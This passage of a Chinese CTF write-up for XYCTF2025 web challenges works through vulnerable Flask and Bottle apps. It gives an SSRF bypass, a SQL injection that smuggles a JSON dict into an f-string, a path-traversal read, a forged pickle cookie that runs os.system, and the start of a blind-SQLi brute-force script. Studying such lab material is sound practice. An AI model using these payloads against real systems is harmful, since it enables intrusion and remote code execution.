class="line"><span class="keyword">import</span> json</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">blacklist = string.ascii_letters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> string_output</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nolettersproxy</span>():</span><br><span class="line">    url = flask.request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>, <span class="string">&#x27;No URL provided&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">&quot;http://lamentxu.top&quot;</span> + url</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;No ssrf allowed&#x27;</span>)</span><br><span class="line">    response = requests.get(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.Response(response.content, response.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(flask.request.remote_addr)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/1337&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_search</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        code = flask.request.args.get(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">&#x27;abcdefghi&#x27;</span>:</span><br><span class="line">            req = flask.request.args.get(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                req = binary_to_string(req)</span><br><span class="line">                <span class="built_in">print</span>(req)</span><br><span class="line">                req = json.loads(req) <span class="comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid JSON&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Empty Person&#x27;s name&quot;</span>)</span><br><span class="line"></span><br><span class="line">            name = req[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">6</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Too long&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO &#x27;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;)&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO )&quot;</span>)</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Some waf hidden here ;)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            fate = db_search(name)</span><br><span class="line">            <span class="keyword">if</span> fate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flask.abort(<span class="number">404</span>, <span class="string">&quot;No such Person&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;Fate&#x27;</span>: fate&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flask.abort(<span class="number">400</span>, <span class="string">&quot;Hello local, and hello hacker&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Only local access allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">conn.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE FATETABLE (</span></span><br><span class="line"><span class="string">  NAME TEXT NOT NULL,</span></span><br><span class="line"><span class="string">  FATE TEXT NOT NULL</span></span><br><span class="line"><span class="string">);&quot;&quot;&quot;</span>)</span><br><span class="line">Fate = [</span><br><span class="line">    (<span class="string">&#x27;JOHN&#x27;</span>, <span class="string">&#x27;1994-2030 Dead in a car accident&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;JANE&#x27;</span>, <span class="string">&#x27;1990-2025 Lost in a fire&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;SARAH&#x27;</span>, <span class="string">&#x27;1982-2017 Fired by a government official&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;DANIEL&#x27;</span>, <span class="string">&#x27;1978-2013 Murdered by a police officer&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;LUKE&#x27;</span>, <span class="string">&#x27;1974-2010 Assassinated by a military officer&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;KAREN&#x27;</span>, <span class="string">&#x27;1970-2006 Fallen from a cliff&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;BRIAN&#x27;</span>, <span class="string">&#x27;1966-2002 Drowned in a river&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;ANNA&#x27;</span>, <span class="string">&#x27;1962-1998 Killed by a bomb&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;JACOB&#x27;</span>, <span class="string">&#x27;1954-1990 Lost in a plane crash&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;LAMENTXU&#x27;</span>, <span class="string">r&#x27;2024 Send you a flag flag&#123;FAKE&#125;&#x27;</span>)</span><br><span class="line">]</span><br><span class="line">conn.executemany(<span class="string">&quot;INSERT INTO FATETABLE VALUES (?, ?)&quot;</span>, Fate)</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先看app.py，&#x2F;proxy路由处存在ssrf，用@和2130706433来绕过就可以，前面的ssrf还是比较简单的我认为，abcdefghi可以二次编码绕过，后面1的传参url编码绕过即可。最后我们需要关注的是json.loads</p><p>读取LAMENTXU即可都得到flag。但是，在app.py中限制了长度不能&gt;6，即不可能读取到LAMENTXU对应的值。</p><p>显然，在限制了长度&lt;6的情况下是不可能直接输入字符串进行SQL注入的。</p><p>然后我们发现了json.loads，且传参没有进行任何检查。我们可以利用列表、元组、字典等类型传入非字符串类型</p><p>最后直接将用户的输入拼接到sql语句里查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cur.execute(f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;&#123;code&#125;&#x27;)))))))&quot;)</span><br></pre></td></tr></table></figure><p>这里可以使用python中格式化字符串的特性。即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span><br><span class="line">print(f&#x27;test &#123;a&#125;&#x27;)</span><br></pre></td></tr></table></figure><p>可以看到输出<code>test [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]</code>。</p><p>因此我们可以构造恶意语句进行拼接从而进行sql注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&#123;&quot;&#x27;)))))))union select FATE from FATETABLE limit 9,1--+&quot;:&quot;1&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>转个二进制传参就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_binary</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将字符串转换为二进制字符串（每个字符对应8位二进制表示）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        input_string: 要转换的字符串</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        由0和1组成的二进制字符串，每个字符对应8位</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    binary_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> input_string)</span><br><span class="line">    <span class="keyword">return</span> binary_output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> string_output</span><br><span class="line"></span><br><span class="line">original_string = <span class="string">&#x27;&#123;&quot;name&quot;:&#123;&quot;\&#x27;)))))))union select FATE from FATETABLE limit 9,1--+&quot;:&quot;1&quot;&#125;&#125;&#x27;</span></span><br><span class="line">binary_str = string_to_binary(original_string)  <span class="comment"># 转换为二进制字符串</span></span><br><span class="line">restored_string = binary_to_string(binary_str)  <span class="comment"># 再转换回原字符串</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;原始字符串: <span class="subst">&#123;original_string&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;二进制表示: <span class="subst">&#123;binary_str&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;还原后的字符串: <span class="subst">&#123;restored_string&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250404165258705.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Do4t_bElIevE_in_FatE_Y1s_Y0u_2_a_Js0n_ge1nus!&#125;</span><br></pre></td></tr></table></figure><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()<span class="comment">#Hell0_H@cker_Y0u_A3r_Sm@r7</span></span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>喜欢bottle框架的题，因为是单文件的，看源码非常方便！！</p><p>这题好像是个1day？？bottle框架的pickle反序列化利用（通过cookie）</p><p>考察的是bottle框架的cookie加密机制。</p><p>至于文件读取直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./.././../secret.txt</span><br></pre></td></tr></table></figure><p>即可绕过。尝试读环境变量等全部失败，且flag的名称为随机的uuid4值，读是读不了一点的，也没能发现flag的名称。</p><p>尝试跟进&#x2F;secret路由下get_cookie以及set_cookie的源码，发现存在pickle.loads，一眼pickle反序列化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span></span><br><span class="line"><span class="string">        `secret` must match the one used to create the cookie (see</span></span><br><span class="line"><span class="string">        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span></span><br><span class="line"><span class="string">        cookie or wrong signature), return a default value. &quot;&quot;&quot;</span></span><br><span class="line">    value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        <span class="comment"># See BaseResponse.set_cookie for details on signed cookies.</span></span><br><span class="line">        <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">            sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line">            <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line">                dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line">                    <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure><p>get_cookie对应cookie的解密机制，set_cookie对应cookie的加密机制，本地搭建一个环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;tac /flag* &gt;1.txt&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/set&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_signed_cookie</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;start&#x27;</span>)</span><br><span class="line">    session = &#123;<span class="string">&quot;name&quot;</span>: cmd()&#125;</span><br><span class="line">    <span class="comment">#session=&#123;&quot;name&quot;:&quot;admin&quot;&#125;</span></span><br><span class="line">    response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Cookie set!&quot;</span></span><br><span class="line"></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8082</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>先尝试将name设置为guest以及admin的值，发现与题目的一样，那么就拿捏了。</p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250404171331082.png" class="" title="This is an example image"><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250404171503774.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!&#125;</span><br></pre></td></tr></table></figure><h2 id="ezsql-手动滑稽"><a href="#ezsql-手动滑稽" class="headerlink" title="ezsql(手动滑稽)"></a>ezsql(手动滑稽)</h2><p>第一关第二关就是sql注入读到就行，第三关是无回显rce。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">target=<span class="string">&#x27;http://eci-2ze8si9wekdzhhw9ll87.cloudeci1.ichunqiu.com/login.php&#x27;</span></span><br><span class="line">sum_str=string.ascii_letters+string.digits+<span class="string">&#x27;-_&#123;&#125;,&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> sum_str:</span><br><span class="line">        <span class="comment">#payload_username=&quot;1&#x27;\tor\tsubstr(database()\tfrom\t&#123;&#125;\tfor\t1)=&#x27;&#123;&#125;&#x27;#&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment">#payload_username = &quot;1&#x27;\tor\tsubstr((select\tgroup_concat(table_name)from\tinformation_schema.tables\twhere\ttable_schema=database())\tfrom\t&#123;&#125;\tfor\t1)=&#x27;&#123;&#125;&#x27;#&quot;.format(i, j)</span></span><br><span class="line">        <span class="comment">#double-check-user</span></span><br><span class="line">        <span class="comment">#payload_username = &quot;1&#x27;\tor\tsubstr((select\tgroup_concat(column_name)from\tinformation_schema.columns\twhere\ttable_name=&#x27;double_check&#x27;)\tfrom\t&#123;&#125;\tfor\t1)=&#x27;&#123;&#125;&#x27;#&quot;.format(i, j)</span></span><br><span 